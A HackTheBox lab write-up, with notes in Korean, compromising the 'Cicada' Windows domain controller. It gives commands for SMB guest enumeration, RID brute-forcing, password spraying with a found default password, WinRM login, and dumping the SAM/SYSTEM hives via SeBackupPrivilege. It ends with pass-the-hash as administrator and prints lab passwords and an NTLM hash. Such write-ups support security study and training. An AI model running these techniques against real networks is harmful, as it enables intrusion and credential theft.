# Cicada - HackTheBox
## Recon
```bash
sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,61586 -sC -sV -vv -oA cicada 10.10.11.35
```
<img width="1107" height="330" alt="image" src="https://github.com/user-attachments/assets/b467909e-f1fa-4287-ba55-d6efed4742e4" />
<img width="1107" height="308" alt="image" src="https://github.com/user-attachments/assets/7736311b-1d6a-47d7-a3ec-cdaca98bea4c" />
<img width="1107" height="237" alt="image" src="https://github.com/user-attachments/assets/ec6e5139-b33c-454e-9f72-f85ca8f048ac" />
<img width="1111" height="229" alt="image" src="https://github.com/user-attachments/assets/2700dfd3-1e65-4f4b-b242-a59949e4bf5d" />
<img width="1111" height="109" alt="image" src="https://github.com/user-attachments/assets/84093786-2a09-4a02-8f9f-42c90bd9ca4f" />

- KERBEROS(88)
- LDAP(389)
- SMB(445)
- WINRM(5985)

---
## SMB
- `/etc/hosts`에 `CICADA-DC.cicada.htb`등록.
<img width="1105" height="71" alt="image" src="https://github.com/user-attachments/assets/1f253464-331f-4879-83f7-232998814098" />

<br>
<br>

- `guest`로그인 성공.
```bash
smbmap -u 'guest' -p '' -H 10.10.11.35
```
<img width="1111" height="245" alt="image" src="https://github.com/user-attachments/assets/81d5cf49-8bbc-42f5-97b2-6ebecc27fc6e" />

<br>
<br>

- `smbclient`로 `/HR` 접속하여 내부 파일 다운로드.
```bash
smbclient //10.10.11.35/HR
```
<img width="1111" height="425" alt="image" src="https://github.com/user-attachments/assets/490ff782-7f87-4cfe-9635-7cff5a2802fc" />

<br>
<br>

- 기본 설정 비밀번호 `Cicada$M6Corpb*@Lp#nZp!8` 발견.
<img width="1105" height="191" alt="image" src="https://github.com/user-attachments/assets/983c0424-16e8-4615-a961-fb705db03e0a" />

<br>
<br>

- `--rid-brute` 옵션을 사용하여 해당 도메인의 유저 목록 수집.
```bash
netexec smb 10.10.11.35 -u 'guest' -p '' --rid-brute
```
<img width="1105" height="486" alt="image" src="https://github.com/user-attachments/assets/5e436ab0-6692-4d67-b88f-fa35e406e295" />

<br>
<br>

- `SidTypeUser`만 추려서 유저목록으로 생성.
<img width="1105" height="225" alt="image" src="https://github.com/user-attachments/assets/b1bc8351-d4ee-4045-b3b1-0f045588dc19" />

<br>
<br>

- 유저목록을 `Cicada$M6Corpb*@Lp#nZp!8` 비밀번호로 로그인 테스트.
- `michael.wrightson`유저 로그인 성공.
```bash
netexec smb 10.10.11.35 -u users -p 'Cicada$M6Corpb*@Lp#nZp!8'
```
<img width="1105" height="344" alt="image" src="https://github.com/user-attachments/assets/2d072ab8-6ee9-4544-a715-6f3d8be9c36b" />

<br>
<br>

- `--users`옵션으로 한번 더 유저 목록 재확인.
- `david.orelious` 패스워드 노출.
```bash
netexec smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```
<img width="1105" height="395" alt="image" src="https://github.com/user-attachments/assets/270490d8-2cf7-4016-93c2-99826cfa687d" />

<br>
<br>

- `david.orelious:aRt$Lp#7t*VQ!3`로 SMB 로그인하여 `/DEV`폴더 발견.
```bash
smbmap -u david.orelious -p 'aRt$Lp#7t*VQ!3' -H 10.10.11.35
```
<img width="1105" height="211" alt="image" src="https://github.com/user-attachments/assets/33914b8d-f234-4732-9db4-9d76f73bdf2b" />

<br>
<br>

- `smbclient`를 사용하여 내부 파일 다운로드.
```bash
smbclient //10.10.11.35/dev -U david.orelious
```
<img width="1105" height="277" alt="image" src="https://github.com/user-attachments/assets/6d5f2355-f52d-46ad-91f9-35ffc39a1f6f" />

<br>
<br>

- `emily.oscars`계정 발견.
<img width="1105" height="277" alt="image" src="https://github.com/user-attachments/assets/9c96ce28-2527-4922-818c-81614ca13530" />

---
## WINRM
- `netexec`로 `emily.oscars:Q!3@Lp#M6b*7t*Vt` winrm 로그인 시도.
```bash
netexec winrm 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```
<img width="1105" height="168" alt="image" src="https://github.com/user-attachments/assets/a30daf66-bbc7-4579-ba99-fd054c71f8bd" />

<br>
<br>

- `winrm`로그인.
```bash
evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```
<img width="1105" height="271" alt="image" src="https://github.com/user-attachments/assets/5bd4d6bf-f724-454e-9d45-746ff108a95a" />

---
## Privesc
- `SeBackupPrivilege`권한 확인.
```powershell
whoami /all
```
<img width="1105" height="217" alt="image" src="https://github.com/user-attachments/assets/5649d50a-9220-4ed7-bf0f-bcf01effe5e7" />

<br>
<br>

- `sam`과 `system` 다운로드.
```powershell
reg save hklm\sam c:\temp\sam

reg save hklm\system c:\Temp\system

download sam

download system
```
<img width="1105" height="306" alt="image" src="https://github.com/user-attachments/assets/3cbe8e49-6577-4652-8764-e29a42527df7" />

<br>
<br>

- 해시 추출
```bash
pypykatz registry --sam sam system
```
<img width="1105" height="264" alt="image" src="https://github.com/user-attachments/assets/a52b43c0-f8a2-4fff-b839-7d4e1fcf9111" />

<br>
<br>

- `administrator:2b87e7c93a3e8a0ea4a581937016f341` 해시로 로그인.
```bash
evil-winrm -i 10.10.11.35 -u administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
```
<img width="1105" height="279" alt="image" src="https://github.com/user-attachments/assets/31ea4cf1-a94c-498f-9062-c59062b591f2" />

---
## FLAG
- `c:\users\emily.oscars.cicada\desktop\user.txt`
<img width="1105" height="199" alt="image" src="https://github.com/user-attachments/assets/33e9a355-48d8-44e9-bf25-0bb03c277f7e" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1105" height="199" alt="image" src="https://github.com/user-attachments/assets/7a812544-6bfd-4af8-a158-994e3bc5f739" />






















